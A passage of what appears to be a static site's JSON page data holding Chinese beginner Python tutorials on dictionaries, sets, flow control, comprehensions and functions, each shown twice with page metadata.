3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n序列解包同时可以作用于字典之上，如果是字典，则默认是key\n\na = {'name':'zhngsan','age':12,'sex':true}\nx,y,z = a\nprint(x,y,z) # name age sex\n\n\n1\n2\n3\n\n\n可以使用字典的items和values获取到键值对序列\n\na = {'name':'zhngsan','age':12,'sex':true}\n\nx,y,z = a.items()\nprint(x,y,z) # ('name', 'zhngsan') ('age', 12) ('sex', true)\nx,y,z = a.values()\nprint(x,y,z) # zhngsan 12 true\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 列表结合字典存储和访问数据\n\n姓名    年龄   薪资      城市\n高小一   18   30000   北京\n高小二   19   20000   上海\n高小五   20   10000   深圳\n\nr1 = {\"name\":\"高小一\",\"age\":18,\"salary\":30000,\"city\":\"北京\"}\nr2 = {\"name\":\"高小二\",\"age\":19,\"salary\":20000,\"city\":\"上海\"}\nr3 = {\"name\":\"高小五\",\"age\":20,\"salary\":10000,\"city\":\"深圳\"}\ntb = [r1,r2,r3]\n\n#获得第二行的人的薪资\nprint(tb[1].get(\"salary\"))\n#打印表中所有的的薪资\nfor i in range(len(tb)):\n  print(tb[i].get(\"salary\"))\n#打印表的所有数据 for i in range(len(tb)):\n  print(tb[i].get(\"name\"),tb[i].get(\"age\"),tb[i].get(\"salary\"),tb[i].get(\"city\"))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 字典底层原理\n\n字典的核心就是散列表，散列表是一个稀疏数组，数组的单元称为bucket。每个bucket包含两个部分，一个是键的引用，一个是值的引用。\n\n# 如何将一个键值对存储到字典中\n\n首先是创建一个字典，为字典分配内存空间，这里为方便计算，采用长度为8。然后获取到这个键值对的key的hash值，然后，因为数组的长度为8，我们取右边3位偏移量，转化为对应的十进制数据，然后查看偏移量5对应的数组位置上是不是空的，如果是，则将键值对放入。如果不是则再向右取三位偏移量。直到发现空的bucket。\n\n# 如何根据键查找值\n\n当我们需要查找值的时候，首先是获取到键的hash，如果数组长度为8，则获取右3位作为偏移量，然后查看对应的位置是否为空。如果为空则返回none。如果不是空，计算这个bucket的key的hash，比较是否和当前查询的键的hash一致。如果一致则返回值。如果不一致，则继续向右取三位进行比较，直到最后，如果没有发现，返回none。\n\n\n# 集合\n\n集合是无序的可变序列，但是元素不能重复。类似于java中的set。集合底层是通过字典实现的。集合的所有元素都是字典的键，因此不可重复。\n\n\n# 集合的相关操作\n\n 1. 使用大括号创建集合\n    \n    a = {1,2,3,'hello'}\n    print(a) #  {1, 2, 3, 'hello'}\n    print(type(a)) # <class 'set'>\n    \n    \n    1\n    2\n    3\n    \n\n 2. 使用set创建集合\n    \n    a = [1,2,2,2,3,4]\n    b = set(a)\n    print(b) # {1, 2, 3, 4}\n    \n    \n    1\n    2\n    3\n    \n\n 3. 使用add添加元素\n    \n    a = {}\n    print(type(a)) # <class 'dict'>\n    a = set()\n    print(type(a)) # <class 'set'>\n    a.add(1)\n    a.add(1)\n    print(a) # {1}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. 使用remove删除元素\n    \n    a = {1,2,3,4,5,6}\n    a.remove(1)\n    a.remove(2)\n    # a.remove(7) # keyerror: 7\n    print(a) # {3, 4, 5, 6}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 5. 使用clear清空集合\n    \n    a = {1,2,3,4,5}\n    a.clear()\n    print(a) # set()\n    \n    \n    1\n    2\n    3\n    \n\n 6. 集合的交差并操作\n    \n    a = {1,2,3,4}\n    b = {3,4,5,6}\n    print(a|b) # 并 # {1, 2, 3, 4, 5, 6}\n    print(a&b) # 交 # {3, 4}\n    print(a - b) # 差 # {1, 2}\n    \n    print(a.union(b))# 并 # {1, 2, 3, 4, 5, 6}\n    print(a.intersection(b))# 交 # {3, 4}\n    print(a.difference(b))# 差 # {1, 2}\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n\n# 参考资料\n\n尚学堂python教程：https://www.bjsxt.com",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python流程控制的那些事",frontmatter:{title:"Python流程控制的那些事",date:"2022-03-22T20:00:00.000Z",permalink:"/sec/dev/python/process",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/02.Python%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.安全/202.安全开发/2020.Python/02.Python流程控制的那些事.md",key:"v-a9def288",path:"/sec/dev/python/process/",headers:[{level:2,title:"选择结构",slug:"选择结构",normalizedTitle:"选择结构",charIndex:83},{level:3,title:"单分支选择结构",slug:"单分支选择结构",normalizedTitle:"单分支选择结构",charIndex:194},{level:3,title:"双分支选择结构",slug:"双分支选择结构",normalizedTitle:"双分支选择结构",charIndex:374},{level:3,title:"三元运算符",slug:"三元运算符",normalizedTitle:"三元运算符",charIndex:453},{level:3,title:"多分支选择结构",slug:"多分支选择结构",normalizedTitle:"多分支选择结构",charIndex:614},{level:3,title:"选择结构的嵌套关系",slug:"选择结构的嵌套关系",normalizedTitle:"选择结构的嵌套关系",charIndex:783},{level:2,title:"循环结构",slug:"循环结构",normalizedTitle:"循环结构",charIndex:88},{level:3,title:"while循环",slug:"while循环",normalizedTitle:"while循环",charIndex:960},{level:3,title:"for循环",slug:"for循环",normalizedTitle:"for循环",charIndex:1014},{level:3,title:"range对象",slug:"range对象",normalizedTitle:"range对象",charIndex:1344},{level:3,title:"break语句",slug:"break语句",normalizedTitle:"break语句",charIndex:1456},{level:3,title:"Continue语句",slug:"continue语句",normalizedTitle:"continue语句",charIndex:1513},{level:3,title:"else语句",slug:"else语句",normalizedTitle:"else语句",charIndex:1581},{level:3,title:"循环的优化",slug:"循环的优化",normalizedTitle:"循环的优化",charIndex:1685},{level:3,title:"zip()并行迭代",slug:"zip-并行迭代",normalizedTitle:"zip()并行迭代",charIndex:1810},{level:3,title:"推导式创建序列",slug:"推导式创建序列",normalizedTitle:"推导式创建序列",charIndex:2159},{level:2,title:"参考资料",slug:"参考资料",normalizedTitle:"参考资料",charIndex:3242}],headersStr:"选择结构 单分支选择结构 双分支选择结构 三元运算符 多分支选择结构 选择结构的嵌套关系 循环结构 while循环 for循环 range对象 break语句 Continue语句 else语句 循环的优化 zip()并行迭代 推导式创建序列 参考资料",content:"# Python流程控制那些事\n\n> 计算机在执行程序解决问题的时候，通常执行程序的流程分为三种：顺序执行、分支选择、循环执行。对应了程序设计中的三个流程：顺序结构、选择结构、循环结构。本篇整理了Python中的流程控制相关事宜。\n\n\n# 选择结构\n\n选择结构是通过判断给定的条件是否成立，决定最终执行哪条分支。选择结构又可以分为单分支、双分支和多分支，具体流程图如下所示：\n\n\n\n\n# 单分支选择结构\n\n单分支的选择通常是使用if语句来实现的，if语句的语法是：\n\nif 条件表达式:\n  语句块\n\n\n1\n2\n\n\n条件表达式：可以是逻辑、算数、关系表达式等等。\n\n语句、语句块：可以是一条语句或者多条语句。\n\n条件表达式为False的情况：False、0、0.0、None、空的序列对象、空range、空迭代。出了上述情况均为True。\n\n\n# 双分支选择结构\n\n双分支选择结构在if的基础之上添加了else：\n\nif 条件表达式:\n  \t语句1\nelse:\n  \t语句2\n\n\n1\n2\n3\n4\n\n\n\n# 三元运算符\n\nPython中提供了三元运算符，和Java中的类似，只是有差异：\n\n# 条件表达式为真的值 if 条件表达式 else 条件表达式为假的值\n\n# 如果 age 大于 18 显示成年 如果不大于则显示 未成年\nprint(\"成年\" if age > 18 else \"未成年\")\n\n\n1\n2\n3\n4\n\n\n\n# 多分支选择结构\n\n多分支选择结构在双分支的基础上添加了elif的判断：\n\nif 条件表达式 1 :\n\t语句 1/语句块 1 \nelif 条件表达式 2:\n\t语句 2/语句块 2 .\nelif 条件表达式 n:\n\t语句 n/语句块 n \n[else:\n\t语句 n+1/语句块 n+1 \n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 选择结构的嵌套关系\n\n选择结构是可以进行嵌套的，但是在Python中由于代码的层级关系和代码的缩紧有关，因此需要格外的注意代码的缩进问题。\n\n\n# 循环结构\n\n循环结构可以重复的执行特定的代码或者代码片段。循环结构的逻辑是：当符合某种条件，执行循环体的内容。每次执行完之后，再次判断是否满足条件。Python中有while和for两种循环方式。\n\n\n# while循环\n\nwhile循环的语法结构：\n\nwhile 条件表达式:\n  循环体\n\n\n1\n2\n\n\n\n# for循环\n\nfor循环通常用于遍历可迭代的对象，语法格式如下：\n\nfor 变量 in 可迭代的对象:\n  循环体\n\n\n1\n2\n\n\n在Python中，可迭代的对象包括：\n\n * 序列：字符串、列表、元组\n * 字典\n * 迭代器对象：iterator\n * 生成器函数：generator\n * 文件对象\n\n下面就来演示一下如何遍历以上的对象：\n\na = \"zhangsan .hello\"\nfor i in a:\n    print(i)\n\na = dict([('name','zhangsan'),('age',12)])\nfor k in a.keys():\n    print(k)\n\n    ……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# range对象\n\nrange对象是一个迭代器的对象，可以用来生成指定范围的数字的序列，语法格式为：\n\nrange(start,end,step)\n\n\n1\n\n\n生成的值是从start开始，到end-1，步长默认是1。\n\n\n# break语句\n\nbreak语句用于结束整个循环。当有嵌套循环存在时，break只能跳出最近的一层循环。\n\n\n# Continue语句\n\ncontinue语句用于结束本次循环，并继续执行判断下一次循环，如果符合循环的条件，则会继续执行循环。\n\n\n# else语句\n\n在while和for循环中可选一个else语句，这个在其他的语言中比较少见，如果for、while语句没有被break语句结束，则会执行else语句，否则则不执行else语句的内容：\n\n\n# 循环的优化\n\n 1. 尽量减少循环内的不必要的计算\n 2. 嵌套循环中，尽量减少内层循环的计算\n 3. 局部变量的查询速度较快，优先使用局部变量\n 4. 连接字符串时，不要使用 + ，用join替换\n 5. 列表删除和插入时，尽量在尾部操作\n\n\n# zip()并行迭代\n\n我们可以通过zip进行并行的迭代，如果zip中最短的序列被迭代完了，则循环停止。因为b列表只有三个元素，所以迭代完成之后结束。\n\na = [1,2,3,4]\nb = ['zhangsan','lisi','wangwu']\nc = ['IT','HR','Leader','Boss']\n\nfor id,name,job in zip(a,b,c):\n    print(\"{name}==={id}==={job}\".format(name=name,id=id,job=job))\n\n\"\"\"\nzhangsan===1===IT\nlisi===2===HR\nwangwu===3===Leader\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 推导式创建序列\n\n推导式时从一个活多个迭代器创建序列的一种方式，将多个循环和条件判断结合，避免冗长代码。\n\n# 列表推导式\n\n列表推导式的格式如下：\n\n# [表达式 for item in 可迭代的对象]\n# [表达式 for item in 可迭代的对象 if 条件判断]\n\n\n1\n2\n\n\n例如下面的内容：\n\na = [x for x in range(5)]\nprint(a) # [0, 1, 2, 3, 4]\n\na = [x-1 for x in range(5)]\nprint(a) # [-1, 0, 1, 2, 3]\n\na = [x*2 for x in range(20) if x % 4 == 0]\nprint(a) # [0, 8, 16, 24, 32]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 字典推导式\n\n字典推导式生成字典对象，其格式如下：\n\n# {key_expression : value_expression for 表达式 in 可迭代对象}\n\n\n1\n\n\n和列表推导式类似，也可以存在if条件和for循环。\n\n例如下面的字典推导式例子：\n\na = \"helloworld,java\"\nd = {c:a.count(c) for c in a}\nprint(d) # 'h': 1, 'e': 1, 'l': 3, 'o': 2, 'w': 1, 'r': 1, 'd': 1, ',': 1, 'j': 1, 'a': 2, 'v': 1}\n\n\n1\n2\n3\n\n\n# 集合推导式\n\n集合推导式和列表推导式类似，语法如下：\n\n{表达式 for item in 可迭代的对象}\n\n\n1\n\n\n例如：\n\nx = 'zhangsan'\ny = {c for c in x}\nprint(y) # {'g', 'n', 'h', 's', 'a', 'z'}\n\n\n1\n2\n3\n\n\n# 生成器推导式 （元组）\n\n使用小括号的推导式生成的是一个迭代器。并且当用完一次之后，就无法读取数据了。要使用生成器推导式生成元组，则需要tuple(生成器对象)，如下面所示：\n\nx = (x for x in range(20))\nprint(x) # <generator object <genexpr> at 0x7f7f280e5b60>\nprint(tuple(x)) # (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19)\n\n\n1\n2\n3\n\n\n\n# 参考资料\n\n尚学堂Python教程：https://www.bjsxt.com",normalizedContent:"# python流程控制那些事\n\n> 计算机在执行程序解决问题的时候，通常执行程序的流程分为三种：顺序执行、分支选择、循环执行。对应了程序设计中的三个流程：顺序结构、选择结构、循环结构。本篇整理了python中的流程控制相关事宜。\n\n\n# 选择结构\n\n选择结构是通过判断给定的条件是否成立，决定最终执行哪条分支。选择结构又可以分为单分支、双分支和多分支，具体流程图如下所示：\n\n\n\n\n# 单分支选择结构\n\n单分支的选择通常是使用if语句来实现的，if语句的语法是：\n\nif 条件表达式:\n  语句块\n\n\n1\n2\n\n\n条件表达式：可以是逻辑、算数、关系表达式等等。\n\n语句、语句块：可以是一条语句或者多条语句。\n\n条件表达式为false的情况：false、0、0.0、none、空的序列对象、空range、空迭代。出了上述情况均为true。\n\n\n# 双分支选择结构\n\n双分支选择结构在if的基础之上添加了else：\n\nif 条件表达式:\n  \t语句1\nelse:\n  \t语句2\n\n\n1\n2\n3\n4\n\n\n\n# 三元运算符\n\npython中提供了三元运算符，和java中的类似，只是有差异：\n\n# 条件表达式为真的值 if 条件表达式 else 条件表达式为假的值\n\n# 如果 age 大于 18 显示成年 如果不大于则显示 未成年\nprint(\"成年\" if age > 18 else \"未成年\")\n\n\n1\n2\n3\n4\n\n\n\n# 多分支选择结构\n\n多分支选择结构在双分支的基础上添加了elif的判断：\n\nif 条件表达式 1 :\n\t语句 1/语句块 1 \nelif 条件表达式 2:\n\t语句 2/语句块 2 .\nelif 条件表达式 n:\n\t语句 n/语句块 n \n[else:\n\t语句 n+1/语句块 n+1 \n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 选择结构的嵌套关系\n\n选择结构是可以进行嵌套的，但是在python中由于代码的层级关系和代码的缩紧有关，因此需要格外的注意代码的缩进问题。\n\n\n# 循环结构\n\n循环结构可以重复的执行特定的代码或者代码片段。循环结构的逻辑是：当符合某种条件，执行循环体的内容。每次执行完之后，再次判断是否满足条件。python中有while和for两种循环方式。\n\n\n# while循环\n\nwhile循环的语法结构：\n\nwhile 条件表达式:\n  循环体\n\n\n1\n2\n\n\n\n# for循环\n\nfor循环通常用于遍历可迭代的对象，语法格式如下：\n\nfor 变量 in 可迭代的对象:\n  循环体\n\n\n1\n2\n\n\n在python中，可迭代的对象包括：\n\n * 序列：字符串、列表、元组\n * 字典\n * 迭代器对象：iterator\n * 生成器函数：generator\n * 文件对象\n\n下面就来演示一下如何遍历以上的对象：\n\na = \"zhangsan .hello\"\nfor i in a:\n    print(i)\n\na = dict([('name','zhangsan'),('age',12)])\nfor k in a.keys():\n    print(k)\n\n    ……\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# range对象\n\nrange对象是一个迭代器的对象，可以用来生成指定范围的数字的序列，语法格式为：\n\nrange(start,end,step)\n\n\n1\n\n\n生成的值是从start开始，到end-1，步长默认是1。\n\n\n# break语句\n\nbreak语句用于结束整个循环。当有嵌套循环存在时，break只能跳出最近的一层循环。\n\n\n# continue语句\n\ncontinue语句用于结束本次循环，并继续执行判断下一次循环，如果符合循环的条件，则会继续执行循环。\n\n\n# else语句\n\n在while和for循环中可选一个else语句，这个在其他的语言中比较少见，如果for、while语句没有被break语句结束，则会执行else语句，否则则不执行else语句的内容：\n\n\n# 循环的优化\n\n 1. 尽量减少循环内的不必要的计算\n 2. 嵌套循环中，尽量减少内层循环的计算\n 3. 局部变量的查询速度较快，优先使用局部变量\n 4. 连接字符串时，不要使用 + ，用join替换\n 5. 列表删除和插入时，尽量在尾部操作\n\n\n# zip()并行迭代\n\n我们可以通过zip进行并行的迭代，如果zip中最短的序列被迭代完了，则循环停止。因为b列表只有三个元素，所以迭代完成之后结束。\n\na = [1,2,3,4]\nb = ['zhangsan','lisi','wangwu']\nc = ['it','hr','leader','boss']\n\nfor id,name,job in zip(a,b,c):\n    print(\"{name}==={id}==={job}\".format(name=name,id=id,job=job))\n\n\"\"\"\nzhangsan===1===it\nlisi===2===hr\nwangwu===3===leader\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 推导式创建序列\n\n推导式时从一个活多个迭代器创建序列的一种方式，将多个循环和条件判断结合，避免冗长代码。\n\n# 列表推导式\n\n列表推导式的格式如下：\n\n# [表达式 for item in 可迭代的对象]\n# [表达式 for item in 可迭代的对象 if 条件判断]\n\n\n1\n2\n\n\n例如下面的内容：\n\na = [x for x in range(5)]\nprint(a) # [0, 1, 2, 3, 4]\n\na = [x-1 for x in range(5)]\nprint(a) # [-1, 0, 1, 2, 3]\n\na = [x*2 for x in range(20) if x % 4 == 0]\nprint(a) # [0, 8, 16, 24, 32]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 字典推导式\n\n字典推导式生成字典对象，其格式如下：\n\n# {key_expression : value_expression for 表达式 in 可迭代对象}\n\n\n1\n\n\n和列表推导式类似，也可以存在if条件和for循环。\n\n例如下面的字典推导式例子：\n\na = \"helloworld,java\"\nd = {c:a.count(c) for c in a}\nprint(d) # 'h': 1, 'e': 1, 'l': 3, 'o': 2, 'w': 1, 'r': 1, 'd': 1, ',': 1, 'j': 1, 'a': 2, 'v': 1}\n\n\n1\n2\n3\n\n\n# 集合推导式\n\n集合推导式和列表推导式类似，语法如下：\n\n{表达式 for item in 可迭代的对象}\n\n\n1\n\n\n例如：\n\nx = 'zhangsan'\ny = {c for c in x}\nprint(y) # {'g', 'n', 'h', 's', 'a', 'z'}\n\n\n1\n2\n3\n\n\n# 生成器推导式 （元组）\n\n使用小括号的推导式生成的是一个迭代器。并且当用完一次之后，就无法读取数据了。要使用生成器推导式生成元组，则需要tuple(生成器对象)，如下面所示：\n\nx = (x for x in range(20))\nprint(x) # <generator object <genexpr> at 0x7f7f280e5b60>\nprint(tuple(x)) # (0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19)\n\n\n1\n2\n3\n\n\n\n# 参考资料\n\n尚学堂python教程：https://www.bjsxt.com",charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Python函数的小秘密",frontmatter:{title:"Python函数的小秘密",date:"2022-03-23T20:00:00.000Z",permalink:"/sec/dev/python/func",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["安全开发","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/03.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%B0%8F%E7%A7%98%E5%AF%86.html",relativePath:"02.安全/202.安全开发/2020.Python/03.Python函数的小秘密.md",key:"v-bca2559e",path:"/sec/dev/python/func/",headers:[{level:2,title:"函数简介",slug:"函数简介",normalizedTitle:"函数简介",charIndex:151},{level:2,title:"定义和调用",slug:"定义和调用",normalizedTitle:"定义和调用",charIndex:518},{level:3,title:"函数形参和实参",slug:"函数形参和实参",normalizedTitle:"函数形参和实参",charIndex:775},{level:3,title:"文档字符串",slug:"文档字符串",normalizedTitle:"文档字符串",charIndex:836},{level:3,title:"返回值",slug:"返回值",normalizedTitle:"返回值",charIndex:124},{level:3,title:"变量的作用域",slug:"变量的作用域",normalizedTitle:"变量的作用域",charIndex:1214},{level:3,title:"Python中的参数传递",slug:"python中的参数传递",normalizedTitle:"python中的参数传递",charIndex:1519},{level:3,title:"深拷贝和浅拷贝",slug:"深拷贝和浅拷贝",normalizedTitle:"深拷贝和浅拷贝",charIndex:2069},{level:3,title:"参数的几种类型",slug:"参数的几种类型",normalizedTitle:"参数的几种类型",charIndex:2421},{level:3,title:"Lambda表达式和匿名参数",slug:"lambda表达式和匿名参数",normalizedTitle:"lambda表达式和匿名参数",charIndex:3231},{level:3,title:"eval函数",slug:"eval函数",normalizedTitle:"eval函数",charIndex:3502},{level:3,title:"递归",slug:"递归",normalizedTitle:"递归",charIndex:3758},{level:3,title:"嵌套函数",slug:"嵌套函数",normalizedTitle:"嵌套函数",charIndex:3965},{level:3,title:"nonlocal关键字",slug:"nonlocal关键字",normalizedTitle:"nonlocal关键字",charIndex:4002},{level:3,title:"LEGB规则",slug:"legb规则",normalizedTitle:"legb规则",charIndex:4288}],excerpt:'<h1 id="python函数的小秘密"><a class="header-anchor" href="#python函数的小秘密">#</a> Python函数的小秘密</h1>\n<blockquote>\n<p>函数是一个带名字的代码块，通过名称可以在其他位置调用代码块中的语句执行，很方便的实现代码的复用，并且在代码块中的代码修改时，函数调用执行也会执行新的代码，因此函数对于编程语言而言至关重要。函数包含函数调用、传参、返回值等内容。我们在这一篇中，一一整理出来。</p>\n</blockquote>\n',headersStr:"函数简介 定义和调用 函数形参和实参 文档字符串 返回值 变量的作用域 Python中的参数传递 深拷贝和浅拷贝 参数的几种类型 Lambda表达式和匿名参数 eval函数 递归 嵌套函数 nonlocal关键字 LEGB规则",content:"# Python函数的小秘密\n\n> 函数是一个带名字的代码块，通过名称可以在其他位置调用代码块中的语句执行，很方便的实现代码的复用，并且在代码块中的代码修改时，函数调用执行也会执行新的代码，因此函数对于编程语言而言至关重要。函数包含函数调用、传参、返回值等内容。我们在这一篇中，一一整理出来。\n\n\n# 函数简介\n\n一个程序往往代表了完成某种任务的一系列操作的集合，而函数通常是完成这个任务全部方法或者拆分成某一项具体任务的功能步骤的集合。函数是代码复用的通常机制，通过函数极大方便了代码的复用。\n\n在Python中的函数分为以下几种类型：\n\n 1. 内置函数\n    \n    例如我们之间使用过的str list len等，可以直接在代码中调用\n\n 2. 标准库函数\n    \n    我们通过import语句倒入了库，然后使用其中定义的函数\n\n 3. 第三方函数\n    \n    Python社区提供了高质量的第三方库，安装这些库之后，通过import导入，就可以使用第三方的函数了\n\n 4. 用户自定义函数\n    \n    用户自定义的函数是开发中的主体，也是完成项目需求的重要组成，我们主要来看如何自定义用户函数。\n\n\n# 定义和调用\n\nPython中定义一个函数的基本语法如下：\n\ndef 函数名称(参数列表):\n  函数体\n\n\n1\n2\n\n\nPython中执行到def时，会创建一个函数的对象，并且绑定到函数的变量名称之上。括号内是函数的形式参数列表，可以没有参数，但是括号必须保留。如果函数体中有return语句，则可以执行return返回值，如果没有return，默认返回None。我们在调用函数之前，必须要先定义函数。内置的函数对象会自动创建，标准库中的和第三方库中的函数，在import时，也会执行模块中的def语句。\n\n\n# 函数形参和实参\n\n形参和实参可以简单理解为在定义函数时参数列表中的参数为形参，在实际调用传递给函数的参数为实参。\n\n\n# 文档字符串\n\n在程序中，我们通常使用井号编写一段注释，在函数中，通常在函数题开始的部分附上一段函数的定义说明，这就是文档字符串也称为函数注释，通常使用三个单引号或者双引号实现。之后可以通过print(函数名.__doc__)输出文档字符串：\n\ndef hello():\n    '''this is a hello world program...'''\n    print(\"helloworld\")\n\nprint(hello.__doc__) # this is a hello world program...\n\n\n1\n2\n3\n4\n5\n\n\n\n# 返回值\n\n如果函数体中包含了return语句，则会结束函数的执行并且返回返回值；\n\n如果函数体中不包含return语句，则默认返回None\n\n如果需哟啊返回多个值，则使用序列将其存起来，一起返回\n\n\n# 变量的作用域\n\n不同变量的作用范围不同，变量的作用范围称为变量的作用域，不同作用域内的同名变量不受影响。变量可以分为全局变量和局部变量：\n\n * 全局变量\n   * 在函数和类定义之外声明的变量，作用域是定义的模块，从定义开始到整个模块的结束\n   * 全局变量降低函数的通用性和可读性，避免使用全局变量\n   * 全局变量一般作为常量使用，函数内如果需要改变全局变量的值，则需要global声明\n * 局部变量\n   * 局部变量是在函数体中声明的变量\n   * 局部变量的引用要比全局变量快，因此优先使用局部变量\n   * 局部变量和全局变量同名，则优先shiyong 同名的局部变量，就近原则。\n\n\n# Python中的参数传递\n\n函数的参数传递本质上就是将实际参数的值赋值给形参的过程。在Python中，一切皆是对象，所有的赋值操作都是引用复制。因此Python中的所有参数传递都是引用传递而不是值传递。因此对于可变对象的写操作会直接作用域原来的对象，对不可变对象的写操作，会产生一个新的对象，并填充新的值，是一种假的值传递。\n\n可变的对象有：字典、列表、集合、自定义的对象等\n\n不可变的对象：数字、字符串、元组、方法等。\n\n在传递可变对象时，如传递的是一个列表，则如果在函数中修改了形参的值，实际上实参的值也会改变。如果传递的是不可变的对象，因为参数的值不可变，则会复制一份出来，重新创建一个对象，就像其他语言中的值传递一样。\n\n例子：\n\ndef add1(n):\n    n -= 1\n\ndef add2(n):\n    n[0] -= 1\n\na = 1\nadd1(a)\nprint(a) # 1\n\na = list()\na.append(1)\nadd2(a)\nprint(a[0]) # 0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n如果某个方法传递的是一个不可变对象作为参数，但是参数中包含了一个可变对象，则函数内修改可变对象也会影响函数外的参数的值。\n\n\n# 深拷贝和浅拷贝\n\n深拷贝会包括自对象一起拷贝，对子对象的修改不会影响原来的对象\n\n浅拷贝不会拷贝自对象的内容，只是拷贝了子对象的引用。\n\n在Python中使用copy完成浅拷贝，使用deepcopy完成深拷贝\n\na = [1,2,3,[4,5,6]]\n\nb = copy.copy(a)\n# b[3][0] = 1\nprint(b) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [1, 5, 6]]\n\nc = copy.deepcopy(a)\nc[3][0] = 1\nprint(c) # [1, 2, 3, [1, 5, 6]]\nprint(a) # [1, 2, 3, [4, 5, 6]] \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 参数的几种类型\n\n# 位置参数\n\n函数调用时，实际参数默认按照位置顺序传递，因此需要传递的形参个数和实际的参数匹配。按位置传递参数称为：位置参数。\n\n# 默认值参数\n\n在声明函数时，可以为参数设置默认值，这样这个参数就是可选的了，因此在没有传递值的时候就会使用默认值。但是默认参数要放在参数列表的最后面。\n\n# 命名参数\n\n我们也可以按照参数的名称传递参数，也称为关键字参数，这种传递参数的方式不需要位置的顺序。\n\n# 可变参数\n\n可变参数指的是在传递参数时，参数的数量可以发生变化。在Java中使用String .. args表示可变参数。在Python中使用*param一个星号，代表将多个参数放入到一个元组对象中去。**param表示将多个参数放入到一个字典中去。\n\n# 强制命名参数\n\n在可变参数后面命名的参数必须在调用的时候进行强制的命名。\n\ndef show1(a,b,c):\n    print(a,b,c)\n\nshow1(1,2,3) # 位置参数\n\ndef show2(a,b,c=10):\n    print(a,b,c)\n\nshow2(1,2) # 默认值参数\n\ndef show3(a,b,c):\n    print(a,b,c)\n\nshow3(c=1,a=2,b=3) # 命名参数\n\ndef show4(*a,**b):\n    print(type(a))\n    print(type(b))\n\nshow4(4,5,6,7,name='zhangsan',age=13) # 可变参数\n\ndef show5(*a,b,c,d):\n    print(type(a))\n\nshow5(1,2,3,4,b=2,c=3,d=4) # 强制命名参数\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# Lambda表达式和匿名参数\n\nlambda表达式可以用来声明一个匿名的函数，lambda函数是一个简单的在一行中定义函数的方法。lambda中只能包含一个表达式，而不能包含复杂的语句，该表达式计算的是函数的返回值。lambda的基本语法如下：\n\nlambda arg1,agr2,arg3 : 表达式\n\n\n1\n\n\n举例子：\n\nf = lambda a,b,c : a+b+c\nprint(f) # <function <lambda> at 0x7fadf00abd90>\nprint(f(1,2,3)) # 6\n\n\n1\n2\n3\n\n\n\n# eval函数\n\neval函数可以将字符串当成有效的表达式并计算结果。\n\n语法：\n\neval(source [,globals[,locals]]) -> value\n\n\n1\n\n\nSource: 一个Python表达式或者函数compile返回的代码对象\n\nglobals：可选值，要求是一个dictionary\n\nlocals：可选值，映射的任意对象\n\na = 10\nb = 20\neval(\"print(a+b)\") # 30\n\n\n1\n2\n3\n\n\neval函数会讲字符串当作语句执行，因此非常的危险。\n\n\n# 递归\n\n递归大概就是指自己调用自己的一个过程。一个有效的递归函数要包含一个递归体和一个有效的终止条件，否则程序会一直递归调用，最终耗尽资源。\n\ndef factorial(n):\n    if n == 1: return 1\n    return n*factorial(n-1)\n\nfor i in range(1,6):\n    print(factorial(i))\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# 嵌套函数\n\n是在函数内部定义的函数。\n\n嵌套函数在外部无法访问。\n\n\n# nonlocal关键字\n\nnonlocal 用于声明外层的局部变量\n\nglobal 用来声明全局变量\n\na = 10\ndef outer():\n    b = 20\n    def inner():\n        nonlocal b\n        print(b) # 20\n        b = 20\n        global a\n        a = 1000\n    inner()\n    print(b) # 20 \n\nouter()\nprint(a) # 1000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# LEGB规则\n\n在Python中，如果是要查找某个变量时，按照LEGB的规则进行查找的：\n\nLOCAL --- Enclosed --- GLOBAL --- Built in\n\n * Local： 指的是函数或者方法的内部\n * enclosed ：指的是嵌套的函数\n * global：值得是模块中的全局变量\n * built in：python保留的名称\n\n如果每一个都没有找到，就会报错。NameERROR",normalizedContent:"# python函数的小秘密\n\n> 